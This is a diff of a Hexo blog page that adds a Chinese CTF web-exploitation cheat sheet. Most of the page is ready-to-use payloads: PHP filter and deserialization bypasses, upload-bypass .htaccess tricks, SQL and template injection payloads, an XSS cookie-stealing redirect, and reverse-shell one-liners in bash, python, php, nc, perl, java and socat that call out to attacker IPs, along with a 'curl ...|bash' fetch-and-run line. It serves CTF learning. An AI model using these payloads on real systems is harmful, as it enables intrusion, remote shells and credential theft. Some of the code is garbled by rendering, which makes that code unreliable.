@@ -5,8 +5,6 @@
   <!-- SEO相关 -->
   
     
-      <meta name="robots" content="noindex,follow">
-    
   
   <!-- 渲染优化 -->
   <meta http-equiv='x-dns-prefetch-control' content='on' />
@@ -21,7 +19,7 @@
 
   <!-- 页面元数据 -->
   
-  <title>Archive - Hexo</title>
+  <title>ctfweb - Hexo</title>
   
 
   
@@ -56,7 +54,7 @@
 <body>
   
 
-<header id="l_header" class="l_header auto shadow blur " style='opacity: 0' >
+<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -307,7 +305,7 @@
     <div id="l_cover">
   
     
-        <div id="half" class='cover-wrapper  dock' style="display: ;">
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
           
             <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg"></div>
           
@@ -383,98 +381,320 @@
         
 
 <div class='l_main'>
-	
-	  <article id="arc" class="post article white-box reveal shadow">
-			
-			
-				
-				
-					
-						
-						<h2>2021</h2>
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/03/08/ctfweb/">
-									<time>03-08</time>
-									
-										ctfweb
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/03/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E5%8C%BA%E9%A2%98%E8%A7%A3/">
-									<time>03-04</time>
-									
-										攻防世界新手区题解
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/03/04/Web%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E5%8C%BA%E9%A2%98%E8%A7%A3%EF%BC%88page1%EF%BC%89/">
-									<time>03-04</time>
-									
-										攻防世界高手区题解（page1）
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/03/04/Bugku%20web%E5%8C%BA/">
-									<time>03-04</time>
-									
-										Bugku
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						
-						<h2>2020</h2>
-					
-						<div class='timenode'>
-								<a class="meta" href="/2020/12/24/hello-world/">
-									<time>12-24</time>
-									
-										Hello World
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-	  </article>
-	
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
+  
+
+
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        ctfweb
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="">
+    <p>请设置文章作者</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Mar 8, 2021</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="ctfweb" data-path="/2021/03/08/ctfweb/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
+        
+      </div>
+    
+  </div>
+
+
+  
+  CTF web小总结
+一些小技巧吧，记录一下，会继续补充
+PHP绕过技巧
+preg_replace
+绕过preg_replace('/('.$re.')/ei','strtolower("\\1")',$str);
+执行phpinfo的payload：\S*=${phpinfo()}
+参考： 深入研究preg_replace与代码执行
+PHP伪随机数
+mt_srand(seed)
+mt_rand()
+只要种子一样，那么生成的随机数是不会变的，所以我们可以利用php_mt_rand4.0进行爆破种子
+比如：
+mt_srand(12345)
+mt_rand()
+第一个肯定是1996335345
+
+HTTP头相关绕过
+伪造IP：
+一般我们都知道可以用XXF伪造IP：X-Forwarded-For:127.0.0.1
+当XXF被过滤的时候我们可以利用Client-IP: 127.0.0.1和X-Real-IP: 127.0.0.1进行绕过
+绕过is_numeric
+代码如下：
+if (is_numeric($password)) {
+	echo "password can't be number</br>";
+}elseif ($password == 404) {
+	echo "Password Right!</br>";
+}
+传入password=404%0a即可绕过7
+数字长度绕过
+采用科学计数法， 100000000 可以表示成10e8
+绕过 (file_get_contents($text,‘r’)===“xxxx”)
+利用php://input协议进行绕过
+POST /?text=php://input
+
+xxxx
+
+data://text/plain协议也可以绕过
+?text=data://text/plain;base64,xxxx的base64加密
+JWT
+在线解密：https://jwt.io/
+爆破工具以及安装方法：
+git clone "https://github.com/brendan-rius/c-jwt-cracker"
+apt-get install libssl-dev
+make
+MD5 hash长度扩展攻击
+原理：Hash Length Extension Attack
+工具安装：
+git clone https://github.com/bwall/HashPump
+apt-get install g++ libssl-dev
+cd HashPump
+make
+{% raw %} make install{% endraw %}
+
+<p>使用方法：<br>比如：md5(secert_key+scan)<br>secert_key为16位、需要把read拓展进去，也就是变成md5(secert_key+scan+read)</p>
+<p>hashdump<br>input Signature: md5(secert_key+scan)值<br>input Date:    scan<br>input Key Length: 16<br>Input Data to add: read    ———— 输入完毕Enter即可</p>
+<p>绕过intval($num)==$num &amp;&amp; 回文<br>?num=1000000000000000.00000000000000010</p>
+<p>绕过 $md5==md5(md5($md5))<br>$md5=0e1138100474 </p>
+<p>绕过$md5==md5($md5)<br>$md5=0e215962016</p>
+<p>PHP反序列化<br>反序列化逃逸<br>第一种关键词过滤，变少的<br>就是由于关键词过滤，导致字符变少的，比如说php置换为空，flag置换为空，这种都有可能导致字符逃逸<br>代表题目[安洵杯 2019]easy_serialize_php<br>第二种关键词过滤，变多的<br>比如说0ctf中的piapiapia，由于where–&gt;hacker导致字符数增加，根据反序列化的特性：反序列化中值的字符读取多少其实是由表示长度的数字控制的 ，;}之后的不会起作用。<br>代表题目0CTF piapiapia、i春秋2020新春公益赛 babyphp<br>session反序列化<br>主要就是由于session处理器不同所导致的问题，比如说系统默认为 php_serialize，而页面中却设置为php，那么就极有可能导致安全问题。具体原理参考文章：PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患<br>代表题目：Jarvis OJ WEB PHPINFO<br>python反序列化<br>import pickle<br>import urllib</p>
+<p>class test(object):<br>    def <strong>reduce</strong>(self):<br>       return (eval, (“open(‘/flag.txt’,’r’).read()”,))</p>
+<p>payload=pickle.dumps(test())<br>payload=urllib.quote(payload)</p>
+<p>print payload</p>
+<p>Phar反序列化<br>要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件<br>&lt;?php<br>    class User{<br>        pop链<br>    }</p>
+<pre><code>$a = new User();
+$a-&gt;db = new FileList();
+
+$phar = new Phar(&quot;1.phar&quot;);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
+$phar-&gt;setMetadata($a);
+$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);
+$phar-&gt;stopBuffering();</code></pre>
+<p>将phar上传，通过phar://伪协议解析phar文件时，会将meta-data进行反序列化<br>注：只有以下函数通过phar://伪协议解析phar文件才会将meta-data进行反序列化<br>fileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_ readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile<br>PHP上传绕过<br>短标签<br>有时在上传的过程中会出现php关键词过滤，这时候可以尝试一下短标签<?=?> <??><br>需要short_open_tag = On<br>如果asp_tags=On那么还支持&lt;%%&gt;的写法<br>绕过对&lt;?的检测<br>1、<script language="php"></script><br>2、对内容进行base64编码，解析时再解码<br>文件头检测绕过<br>一般使用GIF89a进行绕过，不过不适用于.htaccess文件上传，如果这样上传会导致.htaccess无法生效<br>.htaccess中绕过文件头检测:<br>1、在.htaccess前添加<br>#define width 1337<br>#define height 1337<br>#在.htaccess是注释符，所以.htaccess文件可以生效</p>
+<p>2、在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)<br>x00x00x8ax39x8ax39是wbmp文件的文件头<br>.htaccess中以0x00开头的同样也是注释符，所以不会影响.htaccess<br>后缀名绕过<br>phtml、php5、php7等<br>.user.ini<br>nginx的服务器，而且上传目录下有一个php文件，故可以上传.user.ini<br>GIF89a<br>auto_prepend_file=1.gif #php页面自动包含文件<br>.htaccess<br>apache的服务器，可以上传.htaccess<br>同时绕过对&lt;?的检测<br>AddType application/x-httpd-php .abc<br>php_value auto_append_file “php://filter/convert.base64-decode/resource=./文件名”<br>第二种：<br>类似于把文件名后缀1解析成php<br>&lt;FilesMatch “1”&gt;<br>SetHandler application/x-httpd-php<br></FilesMatch><br>shtml文件的SSI注入<br>如果支持shtml，那么可以上传一个shtml文件，里面进行ssi注入：<br>将文本内容直接插入到文档中&lt;#include&gt;<br>&lt;! #include file=”文件名称”–&gt;</p>
+<!--#include virtual="index.html" -->
+<p>直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)</p>
+<!--#exec cmd="cat /etc/passwd"-->
+<p>php文件包含<br>文件包含<br>php://filter/read=convert.base64-encode/resource=文件<br>NGINX日志路径包含<br>file=../../../../../var/log/nginx/access.log<br>SQL注入<br>过滤绕过<br>单引号被过滤：<br>并不一定就能够防止sql注入<br>当sql语句为：select * from users where username=’xxxx’ and password=’xxxx’时<br>我们可以使用\进行绕过，构造username=admin,password=or 1=1#<br>这是sql语句就会变成：<br>select * from users where username=’admin&#39; and password=’or 1=1#’成功绕过<br>select被过滤：<br>这个时候可以盲猜表名进行盲注<br>如果时堆叠注入可以使用handler代替select查询：<br>1’; handler FlagHere open as hack; handler hack read first; handler hack close;<br>=被过滤：<br>可以用like进行绕过<br>and被过滤：<br>可以使用&amp;&amp;绕过<br>or被过滤：<br>可以使用||绕过<br>or被过滤意味着information不能使用，不过可以用mysql.innodb_table_stats和sys.schema_auto_increment_columns<br>in被过滤：<br>同样意味着information不能使用，不过可以使用sys.schema_table_statistics_with_buffer代替<br>空格绕过：<br>/**/<br>updatexml报错注入<br>如果过长无法显示可以使用substr、mid剪切，或者使用left、right<br>基于regexp的时间盲注<br>select * from flllllllag where id=1 and if((substr((flag),1,1) regexp “^f”), sleep(5),1)<br>无union select和字段名注数据<br>常用的无字段名注入都依赖于union select，如果不允许union和select同时出现，那可以使用如下方法<br>如果表中只有一列可以 SUBSTR((SELECT * FROM table),1,1)=’x’<br>如果由两列： 需要将查询语句与相同数量的列进行比较，再配合 &lt;= 进行盲注<br>如果说数据库中的table2中有两列，一个id，一个flag，这可以采用如下方法进行盲注<br>执行select (select ‘1’,’e<del>‘)&gt;(select * from table2 limit 1)显示0<br>执行select (select ‘1’,’f</del>‘)&gt;(select * from table2 limit 1)显示1<br>执行select (select ‘1’,’fl~’)&gt;(select * from table2 limit 1)显示1<br>不过注意一点mysql默认是不区分大小写的，所以我们可以转化成16进制再执行<br>PDO宽字节注入<br>check过滤了：<br>‘/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|^|&amp;|database/i’</p>
+<p>if(check($id)){<br>    $query = “select balabala from table1 where 1=?”;<br>    $db-&gt;query(“set names gbk”);<br>    $row = $db-&gt;prepare($query);<br>    $row-&gt;bindParam(1,$id);<br>    $row-&gt;execute();<br>}<br>如果没有过滤那么可以使用宽字节进行注入<br>但是这里过滤了很多的东西，基本都过滤了，但是我们可以利用<br>SET @x=执行SQL语句的16进制;PREPARE a FROM @x;EXECUTE a;进行注入<br>load_file<br>有时候权限可以使用该函数时，可以直接读取文件：load_file(’/var/www/html/xxx.php’)<br>EXIF注入<br>奇葩注入，上传图片，然后在EXIF的comment中写入注入语句即可<br>CTFshow中的题目，利用工具：exiftools，payload：<br>exiftool -overwrite_original -comment=”A_dmin&quot;‘);select 0x3C3F3D60245F504F53545B305D603B into outfile ‘/var/www/html/1.php’;–+”<br>SQLite注入<br>sqlite_master是sqlite数据库中的一个隐藏表，，，，有如下字段：type/name/tbl_name/rootpage/sql<br>usr=’ union select name,sql from sqlite_master–+&amp;pw=admin<br>查询语句：<br>usr=’ union select id,id from Users–+&amp;pw=admin<br>usr=’ union select id,name from Users–+&amp;pw=admin<br>usr=’ union select id,password from Users–+&amp;pw=admin<br>usr=’ union select id,hint from Users–+&amp;pw=admin<br>对应结果：<br>name=+1;<br>name=+admin;<br>name=+3fab54a50e770d830c0416df817567662a9dc85c;<br>name=+my fav word in my fav paper?!;<br>文件名注入<br>数据库语句可能为：<br>INSERT INTO <code>xxx</code>(<code>id</code>, <code>name</code>) VALUES (‘id号’,’图片名’)<br>注入方法：<br>conv函数将16进制转化为10进制进行输出<br>‘+(conv(substr(hex(database()),1,12),16,10))+’.jpg<br>SSRF<br>格式化字符串<br>出现如下代码时，并且对参数没有过滤时：<br>print(sprintf(“$url method&amp;content_size:$method%d”, $detect));<br>可以传递$method=GET%s%，在ssrf题目中可以读取内网的文件<br>XSS<br>原生类XSS<br>代码如下：<br>$a = $_GET[‘yds_is_so_beautiful’];<br>echo unserialize($a);<br>这里有个echo，应该是包含__toString的，那我们可以使用Error和Exception类，直接用Exception，因为Error只适用于php7<br><?php
+$a = serialize(new Exception("<script>window.location.href='IP'+document.cookie</script>"));
+echo urlencode($a);
+?><br>将结果传递就行<br>命令执行<br>各种绕过<br>空格绕过<br>$IFS、$IFS$9g、 ${IFS}<br>关键词绕过，使用变量拼接，如flag被过滤：<br>a=g;cat fla$a.php<br>cat被过滤可以使用cut，more，tail，head等命令<br>奇淫技巧<br>cat <code>ls</code> 会查看ls出来的文件<br>无参RCE<br>即只能通过无参函数来进行命令执行<br>查看当前目录：var_dump(scandir(current(localeconv())));<br>读取倒数第二个文件：readfile(next(array_reverse(scandir(current(localeconv())))));、<br>readfile(next(array_reverse(scandir(getcwd()))));<br>还有session_id(session_start())也能够利用<br>还有getallheaders：<br>请求头最后添加：<br>hacker: system(‘cat flag.php’);</p>
+<p>payload=eval(end(getallheaders()));<br>Curl命令反弹shell<br>接收端创建文件shell.txt写入bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1<br>在命令执行处执行curl http://接收端IP/shell.txt|bash<br>无数字无字母RCE<br>一般采用异或、自增、取反进行绕过<br>异或脚本：<br><?php
+function finds($string){
+    $index = 0;
+    $a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255];
+    for($i=27;$i<count($a);$i++){
+        for($j=27;$j<count($a);$j++){
+            $x = $a[$i] ^ $a[$j];
+            for($k = 0;$k<strlen($string);$k++){
+                if(ord($string[$k]) == $x){
+                    echo $string[$k]."\n";
+                    echo '%' . dechex($a[$i]) . '^%' . dechex($a[$j])."\n";
+                    $index++;
+                    if($index == strlen($string)){
+                        return 0;
+                    }
+                }
+            }
+        }
+    }
+}
+finds("_GET");
+?><br>自增：<br>$<em>=[];$</em>=@”$<em>“;$</em>=$<em>[‘!’==’@’];$__</em>=$<em>;$__=$</em>;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++; $<strong><em>.=$__;$</em></strong>.=$<strong>;$</strong>=$<em>;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$__</em>.=$<strong>;$</strong>=$<em>;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong></em>.=$<strong>;$</strong>=$<em>;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong></em>.=$<strong>;$__</strong>=’<em>‘;$__=$</em>;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$__</strong>.=$<strong>;$</strong>=$<em>;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>__.=$</strong>;$__=$</em>;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>__.=$</strong>;$<strong>=$<em>;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$</strong>++;$<strong>++;$__</strong>.=$__;$</em>=$$__</strong>;$___($<em>[</em>]);//assert($<em>POST[</em>]);<br>绕过open_basedir<br>payload:<br>chdir(‘img’);ini_set(‘open_basedir’,’..’);chdir(‘..’);chdir(‘..’);chdir(‘..’);chdir(‘..’);ini_set(‘open_basedir’,’/‘);echo(file_get_contents(‘/THis_Is_tHe_F14g’));<br>php数学函数getshell<br>?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs});&amp;pi=system()&amp;abs=ls /<br>一句话反弹shell<br>本机监听：<br>nc -lvvp 8080<br>python：<br>python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“174.1.175.38”,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/bash”,”-i”]);’<br>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.37.131”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p>
+<p>python一句话获取标准shell：<br>python -c “import pty;pty.spawn(‘/bin/bash’)”<br>php：<br>php -r ‘$sock=fsockopen(“192.168.37.131”,1234);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’<br>bash直接反弹：<br>bash -i &gt;&amp; /dev/tcp/192.168.37.131/8080 0&gt;&amp;1<br>nc反弹：<br>nc 192.168.31.174 8080 -t -e /bin/bash<br>perl脚本反弹：<br>perl -e ‘use Socket;$i=”192.168.31.41”;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’<br>java脚本反弹：<br>r = Runtime.getRuntime()<br>p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done”] as String[])<br>p.waitFor()<br>msfvenom 获取反弹一句话<br>msfvenom -p cmd/unix/reverse_xxxx lhost=1.1.1.1 lport=12345 R<br>socat 反弹一句话</p>
+<h1 id="第一步：下载socat到-tmp目录下"><a href="#第一步：下载socat到-tmp目录下" class="headerlink" title="第一步：下载socat到/tmp目录下"></a>第一步：下载socat到/tmp目录下</h1><p>wget -q <a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat">https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat</a> -O /tmp/socat</p>
+<h1 id="第二步：给socaat授予可以执行权限"><a href="#第二步：给socaat授予可以执行权限" class="headerlink" title="第二步：给socaat授予可以执行权限"></a>第二步：给socaat授予可以执行权限</h1><p>chmod 755 /tmp/socat<br>#第三步：反弹shell到目标主机的12345端口<br>/tmp/socat exec:’bash -li’,pty,stderr,setsid,sigint,sane tcp:192.168.31.41：12345<br>Linux知识点<br>在 linux 系统中如果一个程序打开了一个文件没有关闭，即便从外部（上文是利用 rm -f flag.txt）删除之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的 fd，通过这个我们即可得到被删除文件的内容。<br>cat /proc/<em>/fd/</em><br>查找报告xxx内容的文件内容<br>find /etc -name “*” | xargs grep “flag{“<br>模板注入<br>smarty php模板注入<br>比如说有个回显IP的： X-Forwarded-For:{{system("cat /flag")}}<br>Twig PHP模板注入<br>提交 {{7*‘7’}} 得到49<br>payload：</p>
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+<p>jinja2 Python模板注入<br>提交 {{7*‘7’}} 得到7777777<br>payload：</p>
+{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__=='_IterationGuard' %}
+{{ c.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()") }}
+{% endif %}
+{% endfor %}
+<p>Tornado模板中的 handler.settings<br>获取handler.settings环境变量 {{handler.settings}}<br>信息泄露<br>PHPINFO<br>目录遍历<br>git泄露<br>.DS_Store<br>robots.txt泄露<br>备份文件泄露<br>.bak、.swp、.php~<br>.swp文件恢复使用命令：vim -r .index.php.swp恢复<br>源码泄露<br>常见的网站源码备份文件后缀<br>tar、tar.gz、zip、rar<br>常见的网站源码备份文件名<br>web、website、backup、back、www、wwwroot、temp<br>用户历史文件<br>/home/www/.bash_history<br>JAVAweb应用目录<br>/WEB-INF/web.xml：                Web应用程序的配置文件<br>/WEB-INF/classes/：                包含站点所有的class文件<br>/WEB-INF/lib/：                    存放需要的jar文件<br>/WEB-INF/src/：                    源码目录<br>/WEB-INF/database.properties：    数据库配置文件</p>
+
+  
+  
+    
+    <div class='footer'>
+      
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=http://example.com/2021/03/08/ctfweb/>http://example.com/2021/03/08/ctfweb/</a></p>
+              
+            
+          </blockquote>
+        </div>
+      
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-03-08T10:36:31+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Mar 8, 2021</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2021/03/08/ctfweb/&title=ctfweb - Hexo&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2021/03/08/ctfweb/&title=ctfweb - Hexo&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2021/03/08/ctfweb/&title=ctfweb - Hexo&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2021/03/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E5%8C%BA%E9%A2%98%E8%A7%A3/'>
+          <p class='title'>攻防世界新手区题解<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>1.view_source：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。 本题打开网页查看源代码即得到flag 2.robots：X老师上课讲了Robots协议，小...</p>
+        </a>
+      
+    </div>
+  
+</article>
+
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+  </article>
+
+
+
+
+
+
 </div>
 <aside class='l_side'>
   
@@ -482,87 +702,28 @@
     
     
 
-<section class="widget blogger shadow desktop mobile">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/Logo-NavBar@3x.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">Hexo</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fas fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fas fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/volantis-x/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fas fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
 
-  
 
-  
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
     
+  <header>
     
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
 
-  
 
-  
-    
-    
+    <div class='content'>
+        
+    </div>
+  </section>
 
-  
 
   
 
 
 </aside>
+
 
 
         
@@ -572,14 +733,14 @@
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
-  pdata.postTitle="";
+  pdata.ispage=true;
+  pdata.postTitle="ctfweb";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
 
   var l_header=document.getElementById("l_header");
   
-  l_header.classList.remove("show");
+  l_header.classList.add("show");
   
 </script>
 
